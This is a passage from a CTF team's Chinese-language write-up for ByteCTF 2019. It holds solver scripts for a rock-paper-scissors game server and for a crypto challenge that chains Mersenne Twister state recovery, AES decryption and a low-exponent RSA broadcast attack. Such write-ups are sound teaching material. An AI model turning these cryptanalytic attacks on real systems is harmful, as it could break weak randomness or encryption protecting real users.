class="line">            target.paste(image, (width*col, height*(i//column), </span><br><span class="line">                                 width*(col + <span class="number">1</span>), height*(i//column + <span class="number">1</span>)))   </span><br><span class="line">target.show()</span><br></pre></td></tr></table></figure>
<p>拿到flag <img src="https://hackmd.summershrimp.com/uploads/upload_f47c3d040ed16a129a345190d1caa97d.png"></p>
<h3><span id="betgame">betgame</span><a href="#betgame" class="header-anchor"></a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;112.125.25.81&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#lis = &#123;&#x27;j&#x27;:&#x27;s&#x27;,&#x27;b&#x27;:&#x27;j&#x27;,&#x27;s&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">lis1 = &#123;<span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;j&#x27;</span>&#125;</span><br><span class="line">lis2 = &#123;<span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">win = <span class="number">0</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sjb</span>():</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(rec)</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">	now = lis1</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(now[rec])</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">	now = lis2</span><br><span class="line">	rec = io.recvline()[-<span class="number">2</span>]</span><br><span class="line">	io.sendline(now[rec])</span><br><span class="line">	msg = io.recvline()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;you win&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sjb()</span><br></pre></td></tr></table></figure>

<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h2><h3><span id="lrlr">lrlr</span><a href="#lrlr" class="header-anchor"></a></h3><p>大致思路就是伪随机预测+rsa的低指数广播攻击</p>
<p>MTRecover得到了所有的key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> MTRecover <span class="keyword">import</span> MT19937Recover</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;old&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bits = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dis = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> bits:</span><br><span class="line">    dis.append(<span class="built_in">int</span>(_))</span><br><span class="line"></span><br><span class="line">mtb = MT19937Recover()</span><br><span class="line">rand = mtb.go(dis)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">	next_rand = rand.getrandbits(<span class="number">128</span>)</span><br><span class="line">	<span class="built_in">print</span> next_rand</span><br></pre></td></tr></table></figure>

<p>根据key解密aes</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stateconvert</span>(<span class="params">key,text</span>):</span><br><span class="line">    key = long_to_bytes(key)</span><br><span class="line">    handle = AES.new(key, AES.MODE_CBC, <span class="string">&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    output = handle.decrypt(text)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	new = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	key = f.read().split(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">tmp1 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">	tmp1.append(bytes_to_long(stateconvert(<span class="built_in">int</span>(key[<span class="built_in">len</span>(key)+i-<span class="number">24</span>]),new[i].decode(<span class="string">&quot;hex&quot;</span>))))</span><br><span class="line"></span><br><span class="line">tmp2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">	tmp2.append(bytes_to_long(stateconvert(<span class="built_in">int</span>(key[<span class="built_in">len</span>(key)+i-<span class="number">48</span>]),long_to_bytes(tmp1[i]))))</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;clist&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp2:</span><br><span class="line">	s += <span class="built_in">str</span>(i).replace(<span class="string">&quot;L&quot;</span>,<span class="string">&quot;&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">f.write(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rsa低指数广播攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">items</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> items))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">        m = N / n</span><br><span class="line">        d, r, s = gmpy2.gcdext(n, m)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>: <span class="keyword">raise</span> Exception(<span class="string">&quot;Input not pairwise co-prime&quot;</span>)</span><br><span class="line">        result += a * s * m</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="comment"># 读入 e, n, c</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clist&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	clist = f.read().split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cl&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	cl = f.read().replace(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> clist:</span><br><span class="line">	c.append(<span class="built_in">int</span>(i))</span><br><span class="line">n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cl:</span><br><span class="line">	n.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">data = <span class="built_in">zip</span>(c, n)</span><br><span class="line">x, n = CRT(data)</span><br><span class="line">realnum = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;  [-]m is: &#x27;</span> + <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(realnum))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!]All Done!&#x27;</span></span><br></pre></td></tr></table></figure>


<p>rsa也出了，然后最后一步逆种子Orz<br>init_state &#x3D; 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_init_state</span>(<span class="params">seed</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="comment"># print bin(seed)[2:]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(seed)[<span class="number">2</span>:]:</span><br><span class="line">        a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(i)):</span><br><span class="line">            a = a ^ seed</span><br><span class="line">        <span class="keyword">if</span> a &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            a = a ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223L</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">result = <span class="number">0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    result = generate_init_state(result)</span><br><span class="line">    <span class="keyword">if</span> long_to_bytes(result)[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    	<span class="built_in">print</span> long_to_bytes(result)</span><br></pre></td></tr></table></figure>

<p>根据异或性质直接爆回去<br><img src="https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png"></p>
<p>坑点在于flag格式 爆了半天bytectf</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>ByteCTF 2019 SU Write Up</p><p><a href="https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/">https://team-su.github.io/2019/09/14/2019-09-07-ByteCTF/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-09-14</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-09</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/ByteCTF/">ByteCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/03/10/2020-03-10-gxzyCTF/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">高校战“疫”网络安全分享赛 2020 SU Write Up</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/08/22/2019-08-22-SUCTF/"><span class="level-item">SUCTF 2019 官方 Write up</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>